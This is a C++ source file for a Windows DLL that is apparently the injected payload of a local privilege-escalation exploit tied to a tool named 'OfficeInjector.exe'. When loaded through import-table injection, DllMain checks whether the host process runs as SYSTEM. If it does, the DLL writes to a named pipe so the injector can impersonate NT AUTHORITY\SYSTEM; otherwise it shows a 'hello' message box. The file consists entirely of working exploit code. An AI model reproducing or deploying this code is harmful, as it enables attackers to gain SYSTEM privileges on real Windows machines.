#include "Injected.h"
#include <memory>

// The DLL needs to have an exported function because the IAT injection imports the first ordinal of the DLL. Without an export the injection will fail
INJECTED_API int Function(void)
{
    return 0;
}

// Write to a pipe opened by OfficeInjector.exe, so it impersonate "NT AUTHORITY\SYSTEM"
void Elevate()
{
    HANDLE pipeHandle = CreateFileW(PIPE_NAME.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (INVALID_HANDLE_VALUE == pipeHandle)
        return;

    const auto msg = "Elevation";
    WriteFile(pipeHandle, msg, strlen(msg), nullptr, nullptr);
    CloseHandle(pipeHandle);
}

PBYTE GetTokenInfoWrap(const HANDLE TokenHandle, const TOKEN_INFORMATION_CLASS TokenInfoClass)
{
    DWORD tokenInformationSize = 0;
    ::GetTokenInformation(TokenHandle, TokenInfoClass, nullptr, 0, &tokenInformationSize);

    // The first call should fail because the buffer pointer is null. It is made to retrieve the required size of the buffer
    const DWORD error = GetLastError();
    if (ERROR_INSUFFICIENT_BUFFER != error)
        return nullptr;

    // Allocate the memory required to store the info
    const auto tokenInfoBuffer = new BYTE[tokenInformationSize];

    // Call GetTokenInformation again with a pointer to a buffer
    if (!::GetTokenInformation(TokenHandle, TokenInfoClass, tokenInfoBuffer, tokenInformationSize, &tokenInformationSize))
        return nullptr;
    return tokenInfoBuffer;
}

bool CompareTokenSid(const HANDLE TokenHandle, const WELL_KNOWN_SID_TYPE WellKnownSid)
{
    const auto tokenInfo = std::unique_ptr<BYTE>(GetTokenInfoWrap(TokenHandle, TokenUser));
    const auto tokenUser = reinterpret_cast<PTOKEN_USER>(tokenInfo.get());
    if (nullptr != tokenUser)
        return IsWellKnownSid(tokenUser->User.Sid, WellKnownSid);
    return false;
}

bool IsSystem()
{
    HANDLE tokenHandle = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
        return false;
    const bool isSystem = CompareTokenSid(tokenHandle, WinLocalSystemSid);
    CloseHandle(tokenHandle);
    return isSystem;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (IsSystem())
            Elevate();
        else
            MessageBoxW(nullptr, L"hello", nullptr, 0);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}